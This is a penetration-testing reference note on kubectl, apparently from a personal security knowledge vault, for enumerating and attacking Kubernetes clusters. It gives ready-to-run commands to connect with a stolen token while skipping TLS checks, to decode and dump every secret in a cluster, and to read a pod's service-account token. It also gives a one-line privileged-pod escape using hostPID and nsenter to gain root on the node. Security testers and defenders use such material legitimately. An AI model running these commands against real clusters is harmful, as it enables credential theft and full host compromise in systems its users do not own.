# kubectl

**Tags:** #Kubernetes #k8s #cloud #enumeration #client

The official Kubernetes command-line client. It talks to the API server (6443) using a bearer token, client cert, or kubeconfig, and is the primary tool for enumerating and manipulating a cluster on an engagement — listing pods/secrets/service-accounts, checking your own effective permissions, and (with the right RBAC) creating privileged pods or role bindings.

**Source:** https://kubernetes.io/docs/reference/kubectl/
**Install:** `apt install kubectl` / `curl -LO https://dl.k8s.io/release/$(curl -Ls https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl`

```bash
# Point at a target with a stolen token, skip TLS verify
kubectl --server=https://<target>:6443 --token=<bearer-token> --insecure-skip-tls-verify get pods -A

# The two most important recon calls
kubectl auth can-i --list                       # my effective permissions
kubectl auth can-i '*' '*' --all-namespaces     # am I effectively cluster-admin?

kubectl get secrets -A                          # enumerate secrets (names)
```

### Read Secret Values (they're base64, not encrypted)

```bash
kubectl get secret <name> -n <ns> -o jsonpath='{.data}' ; echo
kubectl get secret <name> -n <ns> -o go-template='{{range $k,$v := .data}}{{$k}}: {{$v|base64decode}}{{"\n"}}{{end}}'
# dump every secret's values across the cluster
kubectl get secrets -A -o json | jq -r '.items[] | .metadata.namespace+"/"+.metadata.name, (.data // {} | to_entries[] | "  \(.key): \(.value|@base64d)")'
```

### From Inside a Pod

```bash
# the pod's own service-account token (use it as --token against the API)
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
kubectl exec -it <pod> -n <ns> -- /bin/sh          # drop into another pod (if allowed)
```

### Escalate: Privileged Pod → Node Root

With `create pods` rights, schedule a privileged pod that breaks out to the host — the
canonical single-command node escape (hostPID + privileged + `nsenter` into PID 1):

```bash
kubectl run r00t --rm -it --image=alpine --overrides '{"spec":{"hostPID":true,"containers":[{"name":"r00t","image":"alpine","stdin":true,"tty":true,"command":["nsenter","--target","1","--mount","--uts","--ipc","--net","--pid","--","bash"],"securityContext":{"privileged":true}}]}}'
kubectl get nodes -o wide                          # pick a node first
```

> [!note] **See also**
> Services this tool is used against in this vault: [[Services/Cloud & Data/Kubernetes|Kubernetes]] — the full API/RBAC/escape methodology.
> Related tooling: [[Tools/Cloud/kubeletctl|kubeletctl]] (node-level kubelet API), [[Tools/Cloud/peirates|peirates]] (automated in-pod abuse), [[Tools/Cloud/kube-hunter|kube-hunter]] (scanner). The node-escape above is one route into [[Techniques/Container Escape|Container Escape]].

---

*Created: 2026-09-22*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
